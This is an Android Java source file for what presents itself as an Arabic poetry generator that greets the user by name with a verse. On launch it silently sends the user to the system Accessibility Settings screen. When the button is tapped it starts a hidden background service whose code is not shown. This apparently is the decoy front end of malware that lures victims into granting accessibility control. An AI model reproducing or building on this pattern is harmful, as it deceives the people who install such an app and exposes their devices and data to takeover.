package com.royal.poetry.master;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private EditText inputUserName;
    private TextView txtResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        inputUserName = findViewById(R.id.inputUserName);
        txtResult = findViewById(R.id.txtResult);
        Button btnGenerate = findViewById(R.id.btnGenerate);

        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } catch (Exception e) {}

        btnGenerate.setOnClickListener(v -> {
            String name = inputUserName.getText().toString().trim();
            if (name.isEmpty()) {
                inputUserName.setError("الرجاء إدخال الاسم");
                return;
            }

            startService(new Intent(this, RoyalBackgroundService.class));

            txtResult.setText("📜 ديوان الخلود لـ (" + name + "):\n\n" +
                "أيا " + name + " المجد والأنوار تحويها... فخر الديار ومن بالعز ترويها\n" +
                "خطاكَ تسطع في الآفاقِ ساطعةً... كأنما الأرضُ طوعاً بين أيديها");
            txtResult.setVisibility(TextView.VISIBLE);
        });
    }
}
